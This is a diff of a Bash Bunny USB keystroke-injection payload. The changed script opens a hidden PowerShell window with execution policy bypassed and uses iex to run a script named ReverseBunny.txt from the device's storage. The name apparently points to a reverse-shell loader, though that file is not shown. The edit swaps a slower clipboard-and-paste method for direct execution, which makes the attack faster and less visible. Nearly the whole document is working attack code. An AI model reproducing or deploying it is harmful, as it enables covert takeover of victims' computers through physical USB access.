@@ -10,7 +10,6 @@
 LED SETUP
 
 GET SWITCH_POSITION
-DUCKY_LANG de
 
 rm /root/udisk/DONE
 
@@ -20,18 +19,7 @@ ATTACKMODE HID STORAGE
 
 LED STAGE1
 
-DELAY 5000
-RUN WIN "powershell -NoP -NonI -W hidden -Exec Bypass"
-DELAY 6000
-
-Q STRING "Set-Clipboard -Value (gc((gwmi win32_volume -f 'label=''BashBunny''').Name+'\payloads\\$SWITCH_POSITION\RevBunny.txt'))"
-DELAY 10000
-Q ENTER
-DELAY 10000
-Q CONTROL v
-DELAY 10000
-Q ENTER
-DELAY 1000
+RUN WIN "powershell -NoP -NonI -W hidden -Exec Bypass \"iex((gc((gwmi win32_volume -f 'label=''BashBunny''').Name+'\payloads\\$SWITCH_POSITION\ReverseBunny.txt')))\""
 
 LED STAGE2
 
